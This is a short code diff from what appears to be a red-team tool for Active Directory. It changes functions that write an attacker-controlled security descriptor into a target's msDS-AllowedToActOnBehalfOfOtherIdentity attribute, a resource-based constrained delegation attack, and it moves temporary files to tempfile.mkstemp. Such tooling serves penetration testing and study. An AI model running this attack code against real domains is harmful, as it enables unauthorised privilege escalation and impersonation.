@@ -212,11 +212,11 @@ def add_machine_account(dc, auth, machine_name, machine_pass, domain, args=None,
 
 
 def write_rbcd(dc, auth, target_dn, attacker_sid, verbose=False):
-    sd      = _build_security_descriptor(attacker_sid)
-    sd_file = f'/tmp/rbcd_{uuid.uuid4().hex}.bin'
+    sd = _build_security_descriptor(attacker_sid)
+    fd, sd_file = tempfile.mkstemp(prefix='rbcd_', suffix='.bin')
     try:
-        with open(sd_file, 'wb') as fh:
-            fh.write(sd)
+        os.write(fd, sd)
+        os.close(fd)
         attr_val = f'msDS-AllowedToActOnBehalfOfOtherIdentity:file={sd_file}'
         out, rc = run(LDAP, 'mod', auth,
                       [dc, '-ObjectName', target_dn, attr_val],
@@ -240,10 +240,10 @@ def clear_rbcd(dc, auth, target_dn, verbose=False):
     sd_header   += struct.pack('<IIII', owner_offset, 0, 0, dacl_offset)
     sd           = sd_header + dacl + owner_sid
 
-    sd_file = f'/tmp/rbcd_{uuid.uuid4().hex}.bin'
+    fd, sd_file = tempfile.mkstemp(prefix='rbcd_', suffix='.bin')
     try:
-        with open(sd_file, 'wb') as fh:
-            fh.write(sd)
+        os.write(fd, sd)
+        os.close(fd)
         attr_val = f'msDS-AllowedToActOnBehalfOfOtherIdentity:file={sd_file}'
         out, rc = run(LDAP, 'mod', auth,
                       [dc, '-ObjectName', target_dn, attr_val],
